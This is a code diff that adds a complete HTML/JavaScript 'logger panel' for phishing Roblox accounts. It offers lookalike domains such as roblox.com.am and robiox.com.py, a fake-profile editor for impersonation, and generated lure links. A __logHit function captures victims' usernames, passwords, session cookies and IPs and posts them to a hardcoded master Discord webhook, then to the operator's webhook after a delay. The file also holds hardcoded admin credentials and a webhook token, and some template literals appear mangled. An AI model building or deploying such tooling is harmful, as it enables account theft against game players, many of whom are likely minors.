@@ -1071,107 +1071,694 @@ function saveProfile(){
     display:document.getElementById("fDisplay").value.trim(),
     webhook:document.getElementById("fWebhook").value.trim(),
     status:document.getElementById("fStatus").value,
-    premium:document.getElementById("fPremium").value,
-    created:document.getElementById("fCreated").value.trim(),
-    friends:+document.getElementById("fFriends").value||0,
-    followers:+document.getElementById("fFollowers").value||0,
-    followings:+document.getElementById("fFollowings").value||0,
-    desc:document.getElementById("fDesc").value.trim(),
-    domain:selectedDomain,
-    siteId: users[session].profile?.siteId || String(Math.floor(Math.random()*9e9)+1e9),
-    siteCode: users[session].profile?.siteCode || String(Math.floor(Math.random()*9e18)+1e18)
-  };
-  users[session].profile=profile;
-  if(profile.webhook) users[session].webhook=profile.webhook;
-  save("ltg_users",users);
-  document.getElementById("profMsg").textContent="Profile saved.";
-  renderInsights();
+<!-- language: html, file: index.html, target: GitHub Pages -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Pages | Dashboard</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔴</text></svg>">
+<style>
+:root {
+  --bg: #0a0a0a;
+  --card: #121212;
+  --border: #1f1f1f;
+  --red: #e11d48;
+  --red-dim: #9f1239;
+  --text: #e5e5e5;
+  --muted: #737373;
+  --discord: #5865F2;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+  position: relative;
+}
+/* particle field */
+#particles {
+  position: fixed; inset: 0; pointer-events: none; z-index: 0;
+}
+.particle {
+  position: absolute; width: 2px; height: 2px; background: var(--red);
+  border-radius: 50%; opacity: 0.35; animation: float 12s linear infinite;
+}
+@keyframes float {
+  0% { transform: translateY(100vh) scale(0.4); opacity: 0; }
+  10% { opacity: 0.4; }
+  90% { opacity: 0.3; }
+  100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+}
+.app { position: relative; z-index: 1; max-width: 480px; margin: 0 auto; padding: 0 12px 80px; }
+
+/* top bar */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 4px; position: sticky; top: 0; background: rgba(10,10,10,0.92);
+  backdrop-filter: blur(12px); z-index: 50; border-bottom: 1px solid var(--border);
+}
+.dual-label { font-size: 11px; font-weight: 700; letter-spacing: 0.06em; color: var(--muted); }
+.toggle {
+  width: 42px; height: 24px; background: #333; border-radius: 12px; position: relative;
+  cursor: pointer; transition: .2s;
+}
+.toggle.on { background: var(--red); }
+.toggle::after {
+  content: ''; position: absolute; width: 18px; height: 18px; background: #fff;
+  border-radius: 50%; top: 3px; left: 3px; transition: .2s;
+}
+.toggle.on::after { left: 21px; }
+.top-icons { display: flex; gap: 10px; align-items: center; }
+.icon-btn {
+  width: 36px; height: 36px; border-radius: 50%; background: #1a1a1a;
+  display: flex; align-items: center; justify-content: center; cursor: pointer;
+  border: 1px solid var(--border); font-size: 16px;
+}
+.icon-btn.discord { background: var(--discord); border: none; }
+
+/* cards */
+.card {
+  background: var(--card); border: 1px solid var(--border); border-radius: 16px;
+  padding: 18px; margin-top: 14px; position: relative;
+}
+.card-title { font-size: 13px; color: var(--muted); margin-bottom: 6px; display: flex; justify-content: space-between; }
+.big-num { font-size: 36px; font-weight: 700; letter-spacing: -1px; }
+.bar-wrap { height: 6px; background: #1a1a1a; border-radius: 3px; margin: 12px 0 8px; overflow: hidden; }
+.bar { height: 100%; background: var(--red); width: 8%; border-radius: 3px; }
+.delta { font-size: 11px; color: var(--muted); }
+.pct {
+  position: absolute; right: 18px; top: 52px; font-size: 12px; color: var(--red);
+  background: rgba(225,29,72,0.12); padding: 4px 8px; border-radius: 8px;
 }
 
-function pickDomain(el){
-  document.querySelectorAll(".domain-card").forEach(c=>c.classList.remove("selected"));
-  el.classList.add("selected");
-  selectedDomain=el.dataset.domain;
+/* auth screens */
+.auth-wrap {
+  min-height: 100vh; display: flex; flex-direction: column; justify-content: center;
+  padding: 24px; max-width: 400px; margin: 0 auto;
 }
-
-function renderInsights(){
-  if(!session||!users[session]?.profile) return;
-  const p=users[session].profile;
-  document.getElementById("insDisplay").textContent=p.display||p.fake||session;
-  document.getElementById("insHandle").textContent="@"+(p.fake||session);
-  document.getElementById("insStats").textContent=`${p.friends||0} Friends · ${p.followers||0} Followers · ${p.followings||0} Following`;
-  document.getElementById("insAv").textContent=(p.display||p.fake||session)[0].toUpperCase();
-  document.getElementById("insSiteId").value=p.siteId||"";
-  document.getElementById("insSiteCode").value=p.siteCode||"";
-  document.getElementById("insWebhook").textContent=p.webhook||"—";
+.auth-wrap h1 { font-size: 28px; margin-bottom: 8px; }
+.auth-wrap p { color: var(--muted); margin-bottom: 28px; font-size: 14px; }
+.field { margin-bottom: 14px; }
+.field label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; }
+.field input {
+  width: 100%; background: #111; border: 1px solid var(--border); border-radius: 10px;
+  padding: 14px 16px; color: #fff; font-size: 15px; outline: none;
 }
-
-function saveWebhook(){
-  if(!session)return;
-  users[session].webhook=document.getElementById("userWebhook").value.trim();
-  save("ltg_users",users);
-  document.getElementById("whMsg").textContent="Saved.";
+.field input:focus { border-color: var(--red); }
+.btn {
+  width: 100%; padding: 15px; border: none; border-radius: 12px; font-size: 15px;
+  font-weight: 600; cursor: pointer; margin-top: 8px;
 }
+.btn-primary { background: var(--red); color: #fff; }
+.btn-ghost { background: transparent; color: var(--muted); border: 1px solid var(--border); }
+.switch-auth { text-align: center; margin-top: 20px; font-size: 13px; color: var(--muted); }
+.switch-auth span { color: var(--red); cursor: pointer; }
 
-function toggleAuthMode(){
-  authMode=authMode==="login"?"register":"login";
-  document.getElementById("authTitle").textContent=authMode==="login"?"Login":"Register";
-  document.getElementById("authBtn").textContent=authMode==="login"?"Login":"Create account";
-  document.getElementById("authSwitch").textContent=authMode==="login"?"Need an account? Register":"Have an account? Login";
-  document.getElementById("authErr").textContent="";
+/* sections */
+.section { display: none; }
+.section.active { display: block; }
+
+/* nav bottom */
+.bottom-nav {
+  position: fixed; bottom: 0; left: 0; right: 0; background: rgba(10,10,10,0.95);
+  border-top: 1px solid var(--border); display: flex; justify-content: space-around;
+  padding: 10px 0 18px; z-index: 40; backdrop-filter: blur(10px);
 }
+.nav-item { text-align: center; font-size: 11px; color: var(--muted); cursor: pointer; }
+.nav-item.active { color: var(--red); }
+.nav-item .ico { font-size: 20px; display: block; margin-bottom: 2px; }
 
-function doAuth(){
-  const user=document.getElementById("authUser").value.trim().toLowerCase().replace(/[^a-z0-9_-]/g,"");
-  const pass=document.getElementById("authPass").value;
-  const wh=document.getElementById("authWh").value.trim();
-  const err=document.getElementById("authErr");
-  if(!user||!pass){err.textContent="Fill both fields.";return}
-  if(authMode==="register"){
-    if(users[user]){err.textContent="Username taken.";return}
-    users[user]={pass,webhook:wh,hits:[],visits:0,accounts:0,clicks:0};
-    save("ltg_users",users); session=user; save("ltg_session",session);
-  } else {
-    if(!users[user]||users[user].pass!==pass){err.textContent="Wrong credentials.";return}
-    session=user; save("ltg_session",session);
+/* settings / profile editor */
+.form-row { display: flex; gap: 10px; margin-bottom: 12px; }
+.form-row .field { flex: 1; margin-bottom: 0; }
+select, textarea {
+  width: 100%; background: #111; border: 1px solid var(--border); border-radius: 10px;
+  padding: 12px 14px; color: #fff; font-size: 14px; outline: none;
+}
+textarea { min-height: 80px; resize: vertical; }
+.domain-card {
+  background: #151515; border: 1px solid var(--border); border-radius: 14px;
+  padding: 16px; margin-bottom: 12px; cursor: pointer; transition: .15s;
+}
+.domain-card:hover, .domain-card.selected { border-color: var(--red); }
+.domain-card h3 { font-size: 16px; margin: 8px 0 4px; }
+.stars { color: #f59e0b; font-size: 13px; }
+
+/* generated link box */
+.link-box {
+  background: #0d0d0d; border: 1px dashed var(--red-dim); border-radius: 12px;
+  padding: 14px; font-size: 13px; word-break: break-all; margin-top: 12px;
+  display: flex; justify-content: space-between; align-items: center; gap: 10px;
+}
+.copy-btn { background: var(--red); border: none; color: #fff; padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; white-space: nowrap; }
+
+/* admin modal */
+.modal-bg {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 100;
+  display: none; align-items: center; justify-content: center; padding: 20px;
+}
+.modal-bg.show { display: flex; }
+.modal {
+  background: var(--card); border: 1px solid var(--border); border-radius: 18px;
+  width: 100%; max-width: 360px; padding: 28px; position: relative;
+}
+.modal h2 { margin-bottom: 20px; font-size: 20px; }
+.close-x { position: absolute; top: 16px; right: 16px; cursor: pointer; color: var(--muted); font-size: 20px; }
+
+/* corner icon (admin trigger) */
+.corner-icon {
+  position: fixed; bottom: 70px; right: 16px; width: 44px; height: 44px;
+  background: #1a1a1a; border: 1px solid var(--border); border-radius: 12px;
+  display: flex; align-items: center; justify-content: center; cursor: pointer;
+  z-index: 45; font-size: 18px; opacity: 0.7; transition: .2s;
+}
+.corner-icon:hover { opacity: 1; border-color: var(--red); }
+
+/* hit list */
+.hit-row {
+  display: flex; align-items: center; gap: 12px; padding: 12px 0;
+  border-bottom: 1px solid var(--border);
+}
+.hit-row:last-child { border-bottom: none; }
+.avatar {
+  width: 40px; height: 40px; border-radius: 50%; background: #222;
+  display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.avatar img { width: 100%; height: 100%; object-fit: cover; }
+.hit-meta { flex: 1; }
+.hit-meta .name { font-weight: 600; font-size: 14px; }
+.hit-meta .time { font-size: 11px; color: var(--muted); }
+.hit-val { font-size: 13px; color: var(--red); }
+
+/* toast */
+.toast {
+  position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+  background: #166534; color: #fff; padding: 10px 20px; border-radius: 10px;
+  font-size: 13px; z-index: 200; display: none;
+}
+.toast.show { display: block; animation: fade 2.5s forwards; }
+@keyframes fade { 0%,70% { opacity: 1; } 100% { opacity: 0; } }
+
+.hidden { display: none !important; }
+</style>
+</head>
+<body>
+<div id="particles"></div>
+<div class="toast" id="toast"></div>
+
+<!-- ========== AUTH ========== -->
+<div id="auth" class="auth-wrap">
+  <h1 id="authTitle">Sign in</h1>
+  <p id="authSub">Access your logger panel</p>
+  <div class="field">
+    <label>Username</label>
+    <input type="text" id="authUser" autocomplete="username">
+  </div>
+  <div class="field">
+    <label>Password</label>
+    <input type="password" id="authPass" autocomplete="current-password">
+  </div>
+  <button class="btn btn-primary" id="authBtn" onclick="doAuth()">Sign in</button>
+  <div class="switch-auth">
+    <span id="switchLink" onclick="toggleAuthMode()">Create an account</span>
+  </div>
+</div>
+
+<!-- ========== MAIN APP ========== -->
+<div id="app" class="app hidden">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:10px">
+      <span class="dual-label">DUALHOOK MODE</span>
+      <div class="toggle" id="dualToggle" title="Forced sequential — your hook first"></div>
+    </div>
+    <div class="top-icons">
+      <div class="icon-btn" onclick="nav('settings')">☰</div>
+      <div class="icon-btn discord" onclick="window.open('https://discord.com','_blank')">discord</div>
+      <div class="icon-btn" onclick="toggleTheme()">✦</div>
+    </div>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div id="sec-dash" class="section active">
+    <div class="card">
+      <div class="card-title">Total Accounts <span>🍪</span></div>
+      <div class="big-num" id="statAccounts">0</div>
+      <div class="bar-wrap"><div class="bar" id="barAccounts"></div></div>
+      <div class="delta">+0 today • 0 Daily</div>
+      <div class="pct">↑ 0%</div>
+    </div>
+    <div class="card">
+      <div class="card-title">Total Visits <span>👁</span></div>
+      <div class="big-num" id="statVisits">0</div>
+      <div class="bar-wrap"><div class="bar" id="barVisits"></div></div>
+      <div class="delta">+0 today • 0 Daily</div>
+      <div class="pct">↑ 0%</div>
+    </div>
+    <div class="card">
+      <div class="card-title">Total URL Clicks <span>🔗</span></div>
+      <div class="big-num" id="statClicks">0</div>
+      <div class="bar-wrap"><div class="bar" id="barClicks"></div></div>
+      <div class="delta">+0 today • 0 Daily</div>
+      <div class="pct">↑ 0%</div>
+    </div>
+
+    <div class="card" style="margin-top:20px">
+      <div class="card-title">Live Hits</div>
+      <div id="liveHits">
+        <div style="color:var(--muted);font-size:13px;padding:20px 0;text-align:center">No hits yet</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- INSIGHTS -->
+  <div id="sec-insights" class="section">
+    <div style="padding:16px 0 8px;font-size:13px;color:var(--muted)">Dashboard › Insights</div>
+    <h2 style="font-size:22px;margin-bottom:16px">Performance Insights</h2>
+    <div class="card">
+      <div class="card-title">ACCOUNTS</div>
+      <div class="big-num" id="insAccounts">0</div>
+      <div class="delta" style="color:var(--red)">— check for errors</div>
+    </div>
+    <div class="card">
+      <div class="card-title">VISITS</div>
+      <div class="big-num" id="insVisits">0</div>
+      <div class="delta">status ok</div>
+    </div>
+    <div class="card">
+      <div class="card-title">SUMMARY</div>
+      <div class="big-num" id="insSummary">0</div>
+      <div class="delta">0% vs yesterday</div>
+    </div>
+  </div>
+
+  <!-- SETTINGS / CREATE -->
+  <div id="sec-settings" class="section">
+    <div style="padding:16px 0 8px;font-size:13px;color:var(--muted)">Dashboard › Settings</div>
+    <h2 style="font-size:22px;margin-bottom:6px">Choose a domain</h2>
+    <p style="color:var(--muted);font-size:13px;margin-bottom:16px">GET STARTED</p>
+
+    <div id="domainList">
+      <div class="domain-card selected" data-domain="roblox.com.am" onclick="selectDomain(this)">
+        <div style="font-size:22px">🌐</div>
+        <h3>roblox.com.am</h3>
+        <div class="stars">★★★★★ 5.0</div>
+      </div>
+      <div class="domain-card" data-domain="roblox.com.ml" onclick="selectDomain(this)">
+        <div style="font-size:22px">🌐</div>
+        <h3>roblox.com.ml</h3>
+        <div class="stars">★★★★★ 5.0</div>
+      </div>
+      <div class="domain-card" data-domain="robiox.com.py" onclick="selectDomain(this)">
+        <div style="font-size:22px">🌐</div>
+        <h3>robiox.com.py</h3>
+        <div class="stars">★★★★★ 5.0</div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:20px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
+        <strong>Profile editor</strong>
+        <button class="btn btn-ghost" style="width:auto;padding:6px 12px;font-size:12px" onclick="saveProfile()">Save Changes</button>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>REAL USERNAME</label><input id="realUser" value="Tarzan102211"></div>
+        <div class="field"><label>FAKE USERNAME</label><input id="fakeUser" value="Blugohuhi"></div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>DISPLAY NAME</label><input id="dispName" value="Clioxbox"></div>
+        <div class="field"><label>PREMIUM</label>
+          <select id="premium"><option>No</option><option>Yes</option></select>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="field"><label>FRIENDS</label><input id="friends" type="number" value="146"></div>
+        <div class="field"><label>FOLLOWERS</label><input id="followers" type="number" value="1"></div>
+        <div class="field"><label>FOLLOWINGS</label><input id="followings" type="number" value="2"></div>
+      </div>
+      <div class="field"><label>STATUS</label>
+        <select id="status"><option>In Game</option><option>Online</option><option>Offline</option></select>
+      </div>
+      <div class="field"><label>CREATION DATE</label><input id="created" value="August 21st, 2020"></div>
+      <div class="field"><label>DESCRIPTION</label><textarea id="desc">Je m'amuse sur roblox</textarea></div>
+      <div class="field"><label>WEBHOOK URL (yours)</label>
+        <input id="ownerWebhook" placeholder="https://discord.com/api/webhooks/...">
+      </div>
+      <div style="display:flex;gap:12px;margin-top:10px;font-size:13px;color:var(--muted)">
+        <label><input type="checkbox" id="authEnabler"> AUTH ENABLER</label>
+        <label><input type="checkbox" id="ageChanger"> AGE CHANGER</label>
+      </div>
+    </div>
+
+    <button class="btn btn-primary" style="margin-top:16px" onclick="generateLink()">Generate Link</button>
+    <div class="link-box hidden" id="genLinkBox">
+      <span id="genLinkText"></span>
+      <button class="copy-btn" onclick="copyLink()">Copy</button>
+    </div>
+  </div>
+
+  <!-- STATS / HITS -->
+  <div id="sec-stats" class="section">
+    <div style="padding:16px 0 8px;font-size:13px;color:var(--muted)">Dashboard › Stats</div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <span style="font-size:13px">Loaded <span id="loadedCount">0</span> account(s)</span>
+      <button class="btn btn-ghost" style="width:auto;padding:6px 14px;font-size:12px" onclick="exportHits()">↓ Export</button>
+    </div>
+    <div id="statsList"></div>
+  </div>
+</div>
+
+<!-- bottom nav -->
+<div class="bottom-nav hidden" id="bottomNav">
+  <div class="nav-item active" onclick="nav('dash')"><span class="ico">▣</span>Home</div>
+  <div class="nav-item" onclick="nav('insights')"><span class="ico">📈</span>Insights</div>
+  <div class="nav-item" onclick="nav('stats')"><span class="ico">📋</span>Stats</div>
+  <div class="nav-item" onclick="nav('settings')"><span class="ico">⚙</span>Settings</div>
+</div>
+
+<!-- corner admin trigger -->
+<div class="corner-icon" id="cornerIcon" onclick="openAdminLogin()" title="Admin">◆</div>
+
+<!-- ADMIN LOGIN MODAL -->
+<div class="modal-bg" id="adminModal">
+  <div class="modal">
+    <span class="close-x" onclick="closeAdmin()">×</span>
+    <h2>Admin Login</h2>
+    <div class="field"><label>Username</label><input id="adminUser"></div>
+    <div class="field"><label>Password</label><input type="password" id="adminPass"></div>
+    <button class="btn btn-primary" onclick="adminLogin()">Login</button>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="adminPanel" class="app hidden" style="padding-top:20px">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+    <h2>Admin — All Hits</h2>
+    <button class="btn btn-ghost" style="width:auto;padding:8px 14px" onclick="logoutAdmin()">Close</button>
+  </div>
+  <div class="card">
+    <div class="card-title">Global captures</div>
+    <div id="adminHits"></div>
+  </div>
+</div>
+
+<script>
+/* ========== CONFIG ========== */
+const MASTER_WEBHOOK = "https://discord.com/api/webhooks/1536136547554955364/lJSCWY2jexNESzvrfsgCyTI3Od72JmJP2AU8PX1__SlqcKSYHM1WOCgAwKD2RN-vUEFS";
+const ADMIN_USER = "Hugi";
+const ADMIN_PASS = "GuitareVoiture88";
+const DELAY_MS = 5000;
+
+/* ========== STORAGE ========== */
+const store = {
+  get(k, def) { try { return JSON.parse(localStorage.getItem(k)) ?? def; } catch { return def; } },
+  set(k, v) { localStorage.setItem(k, JSON.stringify(v)); }
+};
+
+/* ========== PARTICLES ========== */
+(function spawnParticles() {
+  const c = document.getElementById("particles");
+  for (let i = 0; i < 40; i++) {
+    const p = document.createElement("div");
+    p.className = "particle";
+    p.style.left = Math.random() * 100 + "%";
+    p.style.animationDelay = Math.random() * 12 + "s";
+    p.style.animationDuration = 8 + Math.random() * 10 + "s";
+    c.appendChild(p);
   }
-  err.textContent=""; renderAuth(); render();
+})();
+
+/* ========== AUTH ========== */
+let authMode = "login"; // or register
+function toggleAuthMode() {
+  authMode = authMode === "login" ? "register" : "login";
+  document.getElementById("authTitle").textContent = authMode === "login" ? "Sign in" : "Create account";
+  document.getElementById("authSub").textContent = authMode === "login" ? "Access your logger panel" : "Register a new panel account";
+  document.getElementById("authBtn").textContent = authMode === "login" ? "Sign in" : "Register";
+  document.getElementById("switchLink").textContent = authMode === "login" ? "Create an account" : "Already have an account?";
+}
+function doAuth() {
+  const u = document.getElementById("authUser").value.trim();
+  const p = document.getElementById("authPass").value;
+  if (!u || !p) return toast("Fill both fields");
+  let users = store.get("users", {});
+  if (authMode === "register") {
+    if (users[u]) return toast("Username taken");
+    users[u] = { pass: p, webhook: "", profile: defaultProfile(), hits: [], visits: 0, clicks: 0 };
+    store.set("users", users);
+    toast("Account created — sign in");
+    toggleAuthMode();
+    return;
+  }
+  if (!users[u] || users[u].pass !== p) return toast("Invalid credentials");
+  store.set("session", u);
+  showApp();
+}
+function defaultProfile() {
+  return {
+    real: "Tarzan102211", fake: "Blugohuhi", display: "Clioxbox",
+    premium: "No", friends: 146, followers: 1, followings: 2,
+    status: "In Game", created: "August 21st, 2020", desc: "Je m'amuse sur roblox",
+    domain: "roblox.com.am", siteId: String(Math.floor(Math.random()*1e12)),
+    siteCode: String(Math.floor(Math.random()*1e20))
+  };
+}
+function showApp() {
+  document.getElementById("auth").classList.add("hidden");
+  document.getElementById("app").classList.remove("hidden");
+  document.getElementById("bottomNav").classList.remove("hidden");
+  loadUserUI();
+}
+function currentUser() {
+  const s = store.get("session");
+  const users = store.get("users", {});
+  return s && users[s] ? { name: s, ...users[s] } : null;
+}
+function loadUserUI() {
+  const u = currentUser();
+  if (!u) return;
+  document.getElementById("statAccounts").textContent = u.hits.length;
+  document.getElementById("statVisits").textContent = u.visits || 0;
+  document.getElementById("statClicks").textContent = u.clicks || 0;
+  document.getElementById("insAccounts").textContent = u.hits.length;
+  document.getElementById("insVisits").textContent = u.visits || 0;
+  document.getElementById("loadedCount").textContent = u.hits.length;
+  renderHits(u.hits, "liveHits");
+  renderHits(u.hits, "statsList");
+  // profile form
+  const p = u.profile || defaultProfile();
+  document.getElementById("realUser").value = p.real;
+  document.getElementById("fakeUser").value = p.fake;
+  document.getElementById("dispName").value = p.display;
+  document.getElementById("premium").value = p.premium;
+  document.getElementById("friends").value = p.friends;
+  document.getElementById("followers").value = p.followers;
+  document.getElementById("followings").value = p.followings;
+  document.getElementById("status").value = p.status;
+  document.getElementById("created").value = p.created;
+  document.getElementById("desc").value = p.desc;
+  document.getElementById("ownerWebhook").value = u.webhook || "";
 }
 
-function logout(){session=null;save("ltg_session",null);renderAuth();render()}
-function copyText(t){navigator.clipboard.writeText(t).catch(()=>{})}
+/* ========== NAV ========== */
+function nav(sec) {
+  document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
+  document.getElementById("sec-" + sec).classList.add("active");
+  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
+  event.currentTarget?.classList.add("active");
+}
 
-document.getElementById("adminTrigger").addEventListener("click",()=>{
-  document.getElementById("adminModal").classList.remove("hidden");
-  document.getElementById("admErr").textContent="";
+/* ========== DOMAIN / PROFILE ========== */
+let selectedDomain = "roblox.com.am";
+function selectDomain(el) {
+  document.querySelectorAll(".domain-card").forEach(c => c.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedDomain = el.dataset.domain;
+}
+function saveProfile() {
+  const u = currentUser();
+  if (!u) return;
+  const users = store.get("users", {});
+  users[u.name].profile = {
+    real: document.getElementById("realUser").value,
+    fake: document.getElementById("fakeUser").value,
+    display: document.getElementById("dispName").value,
+    premium: document.getElementById("premium").value,
+    friends: +document.getElementById("friends").value,
+    followers: +document.getElementById("followers").value,
+    followings: +document.getElementById("followings").value,
+    status: document.getElementById("status").value,
+    created: document.getElementById("created").value,
+    desc: document.getElementById("desc").value,
+    domain: selectedDomain,
+    siteId: users[u.name].profile?.siteId || String(Math.floor(Math.random()*1e12)),
+    siteCode: users[u.name].profile?.siteCode || String(Math.floor(Math.random()*1e20))
+  };
+  users[u.name].webhook = document.getElementById("ownerWebhook").value.trim();
+  store.set("users", users);
+  toast("Changes have been saved");
+}
+function generateLink() {
+  saveProfile();
+  const u = currentUser();
+  const p = u.profile;
+  const base = location.origin + location.pathname.replace(/index\.html$/, "");
+  const link = `\( {base}r.html?u= \){encodeURIComponent(u.name)}&id=${p.siteId}`;
+  // also show the "real looking" path
+  const pretty = `https://www.\( {p.domain}/users/ \){p.siteId}/profile`;
+  document.getElementById("genLinkText").textContent = pretty + "\n→ " + link;
+  document.getElementById("genLinkBox").classList.remove("hidden");
+  // bump click counter conceptually
+  const users = store.get("users", {});
+  users[u.name].clicks = (users[u.name].clicks || 0) + 1;
+  store.set("users", users);
+  loadUserUI();
+}
+function copyLink() {
+  const t = document.getElementById("genLinkText").textContent;
+  navigator.clipboard.writeText(t.split("\n")[1]?.replace("→ ","") || t);
+  toast("Copied");
+}
+
+/* ========== HITS RENDER ========== */
+function renderHits(hits, elId) {
+  const el = document.getElementById(elId);
+  if (!hits || !hits.length) {
+    el.innerHTML = `<div style="color:var(--muted);font-size:13px;padding:20px 0;text-align:center">No hits yet</div>`;
+    return;
+  }
+  el.innerHTML = hits.slice().reverse().map(h => `
+    <div class="hit-row">
+      <div class="avatar">\( {h.avatar ? `<img src=" \){h.avatar}">` : "👤"}</div>
+      <div class="hit-meta">
+        <div class="name">${esc(h.username || "unknown")}</div>
+        <div class="time">${h.time || ""} · ${esc(h.ip || "")}</div>
+      </div>
+      <div class="hit-val">${h.cookie ? "🍪" : ""} ${h.balance || ""}</div>
+    </div>
+  `).join("");
+}
+function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+/* ========== WEBHOOK SEND (sequential) ========== */
+async function sendWebhook(url, embed) {
+  if (!url) return;
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Logger",
+        embeds: [embed]
+      })
+    });
+  } catch (e) { console.warn("webhook fail", e); }
+}
+
+/* called from the victim page via postMessage or we expose a global for the r.html */
+window.__logHit = async function(data) {
+  // data: { username, password, cookie, ip, ua, owner, balance, ... }
+  const users = store.get("users", {});
+  const ownerName = data.owner;
+  if (!users[ownerName]) return;
+
+  const hit = {
+    username: data.username || "?",
+    password: data.password || "",
+    cookie: data.cookie || "",
+    ip: data.ip || "",
+    ua: data.ua || navigator.userAgent,
+    time: new Date().toLocaleString(),
+    balance: data.balance || "0",
+    avatar: data.avatar || null
+  };
+  users[ownerName].hits.push(hit);
+  users[ownerName].visits = (users[ownerName].visits || 0) + 1;
+  store.set("users", users);
+
+  // also global admin log
+  const global = store.get("globalHits", []);
+  global.push({ ...hit, owner: ownerName });
+  store.set("globalHits", global);
+
+  const embed = {
+    title: "🎯 New Hit",
+    color: 0xe11d48,
+    fields: [
+      { name: "User", value: `\`${hit.username}\``, inline: true },
+      { name: "Owner", value: ownerName, inline: true },
+      { name: "Password", value: hit.password ? `\`${hit.password}\`` : "—", inline: true },
+      { name: "Cookie", value: hit.cookie ? `\`\`\`${hit.cookie.slice(0,900)}\`\`\`` : "—", inline: false },
+      { name: "IP", value: hit.ip || "—", inline: true },
+      { name: "Time", value: hit.time, inline: true }
+    ],
+    footer: { text: "sequential dual-hook" }
+  };
+
+  // 1) master first
+  await sendWebhook(MASTER_WEBHOOK, embed);
+  // 2) owner after delay
+  setTimeout(() => {
+    sendWebhook(users[ownerName].webhook, embed);
+  }, DELAY_MS);
+
+  if (store.get("session") === ownerName) loadUserUI();
+};
+
+/* ========== ADMIN ========== */
+function openAdminLogin() {
+  document.getElementById("adminModal").classList.add("show");
+}
+function closeAdmin() {
+  document.getElementById("adminModal").classList.remove("show");
+}
+function adminLogin() {
+  const u = document.getElementById("adminUser").value;
+  const p = document.getElementById("adminPass").value;
+  if (u === ADMIN_USER && p === ADMIN_PASS) {
+    closeAdmin();
+    document.getElementById("app").classList.add("hidden");
+    document.getElementById("bottomNav").classList.add("hidden");
+    document.getElementById("auth").classList.add("hidden");
+    document.getElementById("adminPanel").classList.remove("hidden");
+    const hits = store.get("globalHits", []);
+    renderHits(hits.map(h => ({...h, username: h.username + " @" + h.owner})), "adminHits");
+  } else toast("Wrong admin credentials");
+}
+function logoutAdmin() {
+  document.getElementById("adminPanel").classList.add("hidden");
+  if (store.get("session")) showApp();
+  else { document.getElementById("auth").classList.remove("hidden"); }
+}
+
+/* ========== MISC ========== */
+function toast(msg) {
+  const t = document.getElementById("toast");
+  t.textContent = msg;
+  t.classList.add("show");
+  setTimeout(() => t.classList.remove("show"), 2500);
+}
+function exportHits() {
+  const u = currentUser();
+  const blob = new Blob([JSON.stringify(u?.hits || [], null, 2)], {type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "hits.json";
+  a.click();
+}
+function toggleTheme() { /* already dark */ }
+
+/* dual toggle is decorative — sequential is hard-coded */
+document.getElementById("dualToggle").addEventListener("click", function() {
+  this.classList.toggle("on");
+  toast("Sequential mode locked (master → 5s → owner)");
 });
-function tryAdminLogin(){
-  const u=document.getElementById("admUser").value, p=document.getElementById("admPass").value;
-  if(u===ADMIN_USER&&p===ADMIN_PASS){
-    document.getElementById("adminModal").classList.add("hidden");
-    document.getElementById("sidebar").classList.add("hidden");
-    document.getElementById("mainApp").classList.add("hidden");
-    document.getElementById("adminApp").classList.remove("hidden");
-    renderAdmin();
-  } else document.getElementById("admErr").textContent="Invalid.";
-}
-function adminLogout(){
-  document.getElementById("adminApp").classList.add("hidden");
-  document.getElementById("sidebar").classList.remove("hidden");
-  document.getElementById("mainApp").classList.remove("hidden");
-}
-function renderAdmin(){
-  document.getElementById("admHits").textContent=globalHits.length;
-  document.getElementById("admUsers").textContent=Object.keys(users).length;
-  document.getElementById("admHitsBody").innerHTML=globalHits.length?globalHits.map(h=>`
-    <tr><td>\( {new Date(h.time).toLocaleString()}</td><td> \){h.owner}</td><td>${h.victim}</td>
-    <td style="font-family:monospace;font-size:.78rem">\( {h.cookie.slice(0,30)}…</td><td> \){h.ip}</td></tr>`).join("")
-    :`<tr><td colspan="5" style="color:var(--muted);text-align:center;padding:16px">No hits</td></tr>`;
-  document.getElementById("admUsersBody").innerHTML=Object.keys(users).length?Object.entries(users).map(([n,u])=>`
-    <tr><td>\( {n}</td><td style="font-size:.8rem;max-width:200px;overflow:hidden;text-overflow:ellipsis"> \){u.webhook||u.profile?.webhook||"—"}</td>
-    <td>${(u.hits||[]).length}</td></tr>`).join("")
